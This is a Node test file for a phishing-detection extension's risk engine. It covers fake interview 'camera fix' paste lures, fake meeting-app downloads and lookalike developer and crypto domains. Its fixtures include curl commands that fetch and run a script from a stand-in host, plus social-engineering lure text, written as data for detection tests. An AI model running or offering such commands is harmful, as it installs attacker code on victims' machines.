/* Rules for fake job interview lures (riskEngine.js): the "fix your camera"
   paste trick, fake meeting-app downloads, and lookalikes of the developer
   and crypto brands those lures copy.
   Run: node --test tests/interview-lure.test.mjs */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import vm from "node:vm";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const load = (ctx, file) => vm.runInNewContext(readFileSync(resolve(ROOT, file), "utf8"), ctx);
const ctx = { window: {}, URL };
ctx.globalThis = ctx;
load(ctx, "extension/lib/publicSuffix.js");
load(ctx, "extension/riskEngine.js");
const engine = ctx.window.PhishCleanRiskEngine;

/* ── Fake interview "camera fix" ── */
const MAC_CMD = 'curl -k -o /var/tmp/ffmpeg.sh https://camera-fix.example/ffmpeg.sh && chmod +x /var/tmp/ffmpeg.sh && nohup bash /var/tmp/ffmpeg.sh >/dev/null 2>&1 &';
const WIN_CMD = 'curl -k -o "%TEMP%\\nvidiaRelease.zip" https://camera-fix.example/nvidia.zip && powershell -Command "Expand-Archive ..."';
const INTERVIEW = "Video interview — Senior Blockchain Developer. Question 2 of 4. Record your answer.";

const lures = {
  "camera blocked, copied mac command": [
    `${INTERVIEW} Camera access is blocked. To fix the camera driver, open Terminal and paste the command we copied, then press Enter.`, MAC_CMD],
  "microphone error, copied windows command": [
    `${INTERVIEW} Microphone not detected. Press Windows + R, paste the command and press Enter to update your audio driver.`, WIN_CMD],
  "copied command on a long interview page": [
    `${INTERVIEW} ` + "Tell us about a project you are proud of. ".repeat(200) + " We couldn't access your camera. Open Terminal and run the fix.", MAC_CMD],
  "no copy, all steps in the text": [
    `${INTERVIEW} Error: camera not working. Fix your camera: open Command Prompt, press Ctrl+V and Enter.`, ""],
};
for (const [name, [text, clip]] of Object.entries(lures)) {
  test(`interview fix flags: ${name}`, () => assert.equal(engine.detectFakeInterviewFix(text, clip), true));
}

const notLures = {
  "camera help article (no interview)": [
    "Camera not working on your Mac? Open Terminal and paste sudo killall VDCAssistant, then press Enter.", ""],
  "real interview, camera check, no commands": [
    `${INTERVIEW} We couldn't access your camera. Click Allow in your browser's permission prompt and try again.`, ""],
  "interview page that copied a non-command": [
    `${INTERVIEW} Camera access is blocked. Copy your meeting link and paste it in a new tab.`, "https://meet.example/abc-defg-hij"],
  "news article quoting the lure": [
    "Researchers say the site shows 'camera access is blocked' during a fake interview. " + "Background on the campaign. ".repeat(300) + "Victims are told to \"open terminal\" and paste a command.", ""],
};
for (const [name, [text, clip]] of Object.entries(notLures)) {
  test(`interview fix does not flag: ${name}`, () => assert.equal(engine.detectFakeInterviewFix(text, clip), false));
}

test("interview fix alerts on its own and stays on for free users", () => {
  const s = engine.SIGNALS.FAKE_INTERVIEW_FIX;
  assert.equal(engine.scoreSignals(new Set([s]), false).shouldAlert, true);
  assert.equal(engine.scoreSignals(new Set([s]), false).level, "danger");
  assert.ok(engine.FREE_SIGNALS.has(s));
});

/* ── Fake meeting app ── */
const JOIN = "Meeting ID 845 221 0937. You have been invited to an interview with the hiring team. To join the meeting, download the latest Zoom client.";
const link = (href, label = "Download", download = false) => ({ href, label, download });
const button = (label) => ({ href: "", label, download: false });

const fakeMeetings = {
  "installer from the lookalike site": ["zoom-meeting-join.example", JOIN, [link("https://zoom-meeting-join.example/ZoomInstaller.exe")]],
  "mac pkg": ["us05web-zoom.example", JOIN, [link("https://cdn.example/Zoom.pkg", "Download for Mac")]],
  "scripted download button": ["teams-interview.example",
    "Microsoft Teams SDK is outdated. Update the Teams SDK to join the interview.", [button("Update now")]],
  "download attribute": ["meet-room.example", JOIN, [link("blob:https://meet-room.example/1", "Download", true)]],
};
for (const [name, [host, text, actions]] of Object.entries(fakeMeetings)) {
  test(`fake meeting app flags: ${name}`, () => assert.equal(engine.detectFakeMeetingApp(host, text, actions), true));
}

const realMeetings = {
  "company page linking to Zoom's own download": ["careers.acme.example", JOIN, [link("https://zoom.us/download", "Download Zoom")]],
  "zoom.us itself": ["us05web.zoom.us", JOIN, [link("https://zoom.us/client/latest/ZoomInstaller.exe")]],
  "software download site without a meeting": ["downloads.example",
    "Download the latest Zoom client for Windows. Version 6.2, 80 MB.", [link("https://downloads.example/zoom.exe")]],
  "invitation that opens in the browser": ["meet.acme.example",
    "You have been invited to an interview. Join the meeting from your browser.", [button("Join now")]],
};
for (const [name, [host, text, actions]] of Object.entries(realMeetings)) {
  test(`fake meeting app does not flag: ${name}`, () => assert.equal(engine.detectFakeMeetingApp(host, text, actions), false));
}

test("fake meeting app alerts on its own and is a paid check", () => {
  const s = engine.SIGNALS.FAKE_MEETING_APP;
  assert.equal(engine.scoreSignals(new Set([s]), true).shouldAlert, true);
  assert.equal(engine.scoreSignals(new Set([s]), false).shouldAlert, false);
});

/* ── Developer and crypto lookalikes ── */
test("lookalikes of the brands fake recruiters copy", () => {
  for (const host of ["hashicorp-terraform.io", "calendly-meet.com", "gitlab-assessment.com", "bybit-careers.com",
    "npmjs-registry.com", "trezor-wallet.app", "terraf0rm.io"]) {
    assert.ok(engine.detectLookalikeDomain(host, false), host);
  }
});

test("the real sites and ordinary words are not lookalikes", () => {
  for (const host of ["terraform.io", "www.hashicorp.com", "calendly.com", "gitlab.com", "bybit.com", "npmjs.com",
    "zoomcar.com", "room.com", "teamsnap.com", "ledger.com", "krakenrum.com"]) {
    assert.equal(engine.detectLookalikeDomain(host, true), null, host);
  }
});
